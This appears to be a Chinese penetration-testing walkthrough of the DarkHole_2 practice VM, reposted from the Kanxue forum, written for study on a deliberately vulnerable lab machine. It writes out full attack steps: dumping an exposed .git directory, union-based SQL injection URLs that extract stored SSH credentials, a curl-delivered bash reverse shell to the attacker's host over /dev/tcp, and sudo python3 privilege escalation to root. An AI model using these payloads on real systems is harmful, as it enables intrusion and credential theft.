---
title: 渗透测试练习——DarkHole_2靶场实践：涉及对.git文件的处理，sql注入及利用sudo提权
url: https://mp.weixin.qq.com/s/cJLZ9zsFD_KYUjQ5VbtrwQ
source: Doonsec's feed
date: 2026-04-16
fetch_date: 2026-04-17T04:46:17.032405
---

# 渗透测试练习——DarkHole_2靶场实践：涉及对.git文件的处理，sql注入及利用sudo提权

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Cpo2XCpI7K3uJut6vGDhcHtcGFhkcnPA6amsgrAmhmftcYrPzT0YLRva8CE18mROnhZuGiaqhA8f2KLomUXuAvLxZzXms7GJXHmOFzlrc9GY/0?wx_fmt=jpeg)

# 渗透测试练习——DarkHole\_2靶场实践：涉及对.git文件的处理，sql注入及利用sudo提权

n\_pc
n\_pc

看雪学苑

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

# DarkHole\_2通关思路

# 1.启动靶机

# 2.开启 kali 的 nmap 进行扫描，确定靶机 ip

namp -sn 192.168.5.0/24

![](https://mmbiz.qpic.cn/mmbiz_jpg/Cpo2XCpI7K2ibKNzpRoSE4WgO20LxicG5ibcYkRhDuejickBbYQgsouWKhGEsRIG8xILPOy8QLIXMCQoZicaSSk1EvibljUWlJwkQhT7JHThTYbVo/640?wx_fmt=other&from=appmsg)

# 3.扫描靶机开放的端口和服务

nmap -sV 192.168.5.241 //-sV 为扫描端口运行服务的版本信息

![](https://mmbiz.qpic.cn/mmbiz_jpg/Cpo2XCpI7K3icyNEIf4ZP2pn1zwsu4Tm0QxWphoXWkibzfLMbqRyNXI1tyYhpJtC6wuXAWOrjicQ1aI99CCutYdjoUMCC5yMmJCp4xTEReJuHI/640?wx_fmt=other&from=appmsg)![]()

# 4.根据扫描结果确定开放了 80 和 22 端口，然后访问一下 80 端口

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Cpo2XCpI7K37q323ozK9tRAxFcgYLtOTq3ZK1tIQLuOhBFhpLTDa2nX5TBHxH9f7iaeicVlwV6LU4QbD391cEQcSzjMZW4GcoAPxZZA6c7nsI/640?wx_fmt=other&from=appmsg)![]()

# 5.扫描网站指纹，没有看到有价值的信息

whatweb 192.168.5.241

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Cpo2XCpI7K2FOhmuZ4vepnKkSYFmKJP0K1HKkOrFJEoZWFbSqPiarEutln0gsSIjRSDsoSlrGeEsEmvOws4ppZEdibWmH5rPRLfVv2x4nraUM/640?wx_fmt=other&from=appmsg)![]()

# 6.扫描目录

dirsearch http://192.168.5.241，可以看到有一个.git 目录

![](https://mmbiz.qpic.cn/mmbiz_jpg/Cpo2XCpI7K2tXBDWrJVF9tnbBWJVTmrwThHZciaMS5J7xrlQ0Xg25xBLZxD0iahkPQxZN9WNKoTfPI6ic56Kc58IicFVBib3kFYlkIiaM9ruia4QeI/640?wx_fmt=other&from=appmsg)![]()

# 7.对.git目录进行操作

下载git-dump脚本，将源代码拔下来，我直接下载并放在kali上进行解压

`tar -zxvf git-dumper-1.0.8.tar.gz`

z表示使用gzip进行解压，适用于.tar.gz或.tgz类型的压缩文件

x表示从归档文件中提取文件，及解压

v表示显示详细过程

f指定要解压的文件名

执行脚本

```
pip install -r requirements.txt
sudo ./git_dumper.py http://192.168.5.241/.git hackgit
cd hackgit
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/Cpo2XCpI7K2eibmkyt9Brp2HrxELjhU6xgUPNf8UwhEBoXH5NFtPedPP6Q5LkEHbyGYUg8lJ2icNXH0UUtAX9AxbdzT5IH1ao3icpEv0uQThpk/640?wx_fmt=other&from=appmsg)![]()

可以看到扒下来的源代码，每一个都可以点进去看一看

利用git log命令可以查看日志

![](https://mmbiz.qpic.cn/mmbiz_jpg/Cpo2XCpI7K1iaylWtOJQkGcV1Ca79N1ianVticxACGIOk97083azTMRbicwG1eHicloBFctqadnlD602iameZfFZiclOibmoibth1JaUasticln11iagks/640?wx_fmt=other&from=appmsg)![]()

加密的地方为进行的具体操作，可以通过git diff命令进行查看

![](https://mmbiz.qpic.cn/mmbiz_jpg/Cpo2XCpI7K2jEIicEUmnVqPicmXG9jRCebl0TWX6TRdZmyfe8df2sveaeYYANaM9DHPibQ5q3LWTBBN6H39wGLahIgPdWwT2uXic87wttGrtBMk/640?wx_fmt=other&from=appmsg)![]()

可以看到第二个加密内容里出现了sql语句，是登录的具体信息，可以得到账号和密码，lush@admin.com/321

# 8.得到密码之后登录

注意到id=1,可能存在注入

![](https://mmbiz.qpic.cn/mmbiz_jpg/Cpo2XCpI7K1ArNUcSn4Ljjal1DJbZgapq35eUnXuGJt9qroJxu7ZuAiahew9Z3Zp5uADaqtDxacjAgYRYmDbqzNDpHWXibRNzbvJXgXV7ubyA/640?wx_fmt=other&from=appmsg)![]()

先判断数字型合适字符型，输入1=1和1=2返回一样，说明不是数字型，确定闭合是单引号还是双引号，结果为单引号。

因为应用程序大多数情况只会返回sql语句第一次查询的数据，所以让前面为false，回显我们需要的第二段查询的数据，使用

```
http://192.168.5.241/dashboard.php?id=-1' union select 1,database(),version(),4,@@datadir,@@basedir --+
```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Cpo2XCpI7K0SxibETvlMicEYNtT8u7MUt7jTp7KqMxgFOoqUsMmqaRHPicBIJwNr2cgaKUacBSEV9DX1wPFtQxPBia5XSfGwrswgxAqDjnMnibT4/640?wx_fmt=other&from=appmsg)![]()

```
http://192.168.5.241/dashboard.php?id=-1%27%20union%20select%201,database(),version(),4,group_concat(table_name),@@basedir%20from%20information_schema.tables%20where%20table_schema=database()%20--+
```

group\_concat会查询所有能查到的数据并组合成一个字符串，也可以利用limit 2,1来一个一个查询。

![](https://mmbiz.qpic.cn/mmbiz_jpg/Cpo2XCpI7K2IX8UZfRRL8ibAZ5Xicj2GJFzUV20UbaPaNkv1wkIWsGq3Vaib14XKKlXdNBU0SsKbO55WA1FE4m8tGgaTGbapWwVMQQ6aMjJgiaw/640?wx_fmt=other&from=appmsg)![]()

继续查列名

```
http://192.168.5.241/dashboard.php?id=-1%27%20union%20select%201,database(),version(),4,group_concat(column_name),@@basedir%20from%20information_schema.columns%20where%20table_name=%27ssh%27--+
```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Cpo2XCpI7K2as5rqWUI94gcysiaObl7Z1WuN2O08DCOS6jR0icia0bHCBr2sQWrx57f0K7C6LqyDwZ3Pc4ribDIS0GS2I2JKzPnXEfduOttvpib4/640?wx_fmt=other&from=appmsg)![]()

查询user列和pass列

```
http://192.168.5.241/dashboard.php?id=-1%27%20union%20select%201,2,3,4,group_concat(user,%27|%27,pass),@@basedir%20from%20ssh--+
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/Cpo2XCpI7K0E4ZR8FAgJC9zqa5fy0k36zeBPyrac5Hxk7SsoNqaX54X9wPia5ibEsKlkC9Ep8tUOqYbULAhzfZNx5nKMPwkYjAHHtnIbOicvXw/640?wx_fmt=other&from=appmsg)![]()

# 9.拿到账密登录ssh

```
ssh jebad@192.168.5.241
```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Cpo2XCpI7K2GbgkSYAoic8duatw5Mm8ejJNOxwnF9w6tEWticp1wKeRWNVWZtFtWxPNQn6hH7amA75Md6G2UibPx6lXibaM0xNic0HJcgP4icHENc/640?wx_fmt=other&from=appmsg)![]()

# 10.进行信息收集

查看计划任务,发现有一个跟losy账户相关的计划任务

```
cat /etc/crontab
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/Cpo2XCpI7K08MXjNQgicGwqsjiaZ4JVu5chzK3BzuEbK03YsQga59rHVeX7dwNhUYP90rhjPc2ngFXIhsibWQow9GJWibZ18FkogPA7iaibndWJeA/640?wx_fmt=other&from=appmsg)![]()

查看历史执行的命令，发现htttp://127.0.0.1:9999可以执行命令

```
cat .bash_history
```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Cpo2XCpI7K1auwRbPFHWLp36qibNnAoqA6kgmeJpMdOoicFzWBqJho4Mw2q4MySMvssZPVyhh7LyXd12qGdCYnIVYPfCb7tYjwXC04nv6eQwo/640?wx_fmt=other&from=appmsg)![]()

![](https://mmbiz.qpic.cn/mmbiz_jpg/Cpo2XCpI7K2TwY1ELXJFaP9Dhoow6R56Z1wv02wsyGT3j9YHx1esqT5zKLia26YmvP47rYzz9pibXFX7t9jrhG8jjia3a2pHI5DxpJHia0m9OD8/640?wx_fmt=other&from=appmsg)![]()

查看端口开放情况，发现确实有9999端口运行着某个服务

![](https://mmbiz.qpic.cn/mmbiz_jpg/Cpo2XCpI7K0JsW6IKtm4o7KfzAm80tt6TOhLZicRI7JkJ4p80HCYZoXUvQuNeXZGicPZAa7XiaDzjfz1Ogu0q5kZbDYw3X7iaL68AibCRdQ8lzT0/640?wx_fmt=other&from=appmsg)![]()

这里虽然开着9999端口，但是并不能访问，需要用到ssh端口转发功能，关于ssh端口转发的详细知识点可以查看 https://zhuanlan.zhihu.com/p/148825449

‍

# 11.kail新开一个窗口，配置ssh端口转发，并借此反弹交互式shell

将靶机的9999端口转发到kali的9999端口，冒号前面的9999代表kali的端口

```
ssh -L 9999:127.0.0.1:9999 jehad@192.168.5.241
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/Cpo2XCpI7K0ZDkPBfJHOSKVwZrxbb9C40ed3usyR2iaXHF2BkWb4y8pDPzK91zWnXicZgP7ricq5A21jz1PGOXbOB3EC2vCx3ibz7T3wugG0GPc/640?wx_fmt=other&from=appmsg)![]()

kaili开启监听4444端口，利用靶机访问之前通过查询历史命令得到的url，执行命令弹shell到kali

```
curl http://127.0.0.1:9999/?cmd=bash+-c+%27bash+-i+%3e%26+%2fdev%2ftcp%2f192.168.5.235%2f4444+0%3e%261%27
```

kali成功接收到losy用户的shell

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Cpo2XCpI7K0ZwRqT7YSfK05A2uqHicAj88gkkVwm5XwMESgIiaMlxhdST9cKIRiaPT0icrckvB5ABdswXDoTZlYrKDCXI5fVqRicUWtkmEJiag4no/640?wx_fmt=other&from=appmsg)![]()

查询.bash\_history得到losy用户的密码

![](https://mmbiz.qpic.cn/mmbiz_jpg/Cpo2XCpI7K0bI4zrEbUp29icxbksV9QVL9cvlTVj6o8cicN5vBQRXFC5UHqZHdptNlXAuicGsAqaeUBNbkJib8y66U6perdoakG3j4WKoxM4RKI/640?wx_fmt=other&from=appmsg)![]()

新开一个窗口通过ssh登录losy，然后通过sudo -l查询可以通过sudo执行的命令，发现python3

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Cpo2XCpI7K0e1GID0Vqve2StkBcyjrF7kicq7aAlsib5KBBGSV6ncNwXxaXXLE6khbtnMC02kskdQGxfwn2LLAXAFlMaibdQf2Np63rdmQjGrs/640?wx_fmt=other&from=appmsg)![]()

# 12.通过python3反弹一个shell到kali，得到root权限的shell，查询/root/root.txt得到flag，结束

```
sudo /usr/bin/python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/Cpo2XCpI7K0EvQO2mj3nVCcr5Qicx7vNbKNa4aQJbSZ5icmNmglYUZicIwnTcVoA1rPUkMDS3qbg0lqxOxgkIFYPwfe0yFJWDbMtFwNnEOico3c/640?wx_fmt=other&from=appmsg)![]()

##

![](https://mmbiz.qpic.cn/mmbiz_jpg/Cpo2XCpI7K1EvCiaj59s3kiayIegDlIVibhqM8PdyIacDoY40J5y4yHsYlYSmQMcyOXCJJtNXs4NicOM45ESUQSR8fibhU9Pnbe45uxBkUhsxHZk/640?wx_fmt=jpeg&from=appmsg)

看雪ID：n\_pc

https://bbs.kanxue.com/user-home-1014165.htm

\*本文为看雪论坛优秀文章，由 n\_pc 原创，转载请注明来自看雪社区

![](https://mmbiz.qpic.cn/mmbiz_jpg/Cpo2XCpI7K2qcLqpRmOMibeYwDybhCLLIjdNicUibsZsCmf4IQWHhSkZ8vaFGSPmKKNcSdD8ansPXR7U0ricmvGqBM3XEmciazwVm1V3Lq4qvQbE/640?wx_fmt=jpeg&from=appmsg)![]()![]()![]()

# 往期推荐

[无声的提权：Windows攻击链中的进程伪装与UAC绕过](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458613414&idx=2&sn=da477c224b836820e9225556a4d1a962&scene=21#wechat_redirect)

[ivanti CVE-2025-0282 漏洞复现](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458613407&idx=1&sn=30bf32e1f57fead35b98087dc646ed4d&scene=21#wechat_redirect)

[Linux arm64 内核Hook实现与校验绕过](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458613330&idx=1&sn=a06f6c489372da6017fb6426da80ecc9&scene=21#we...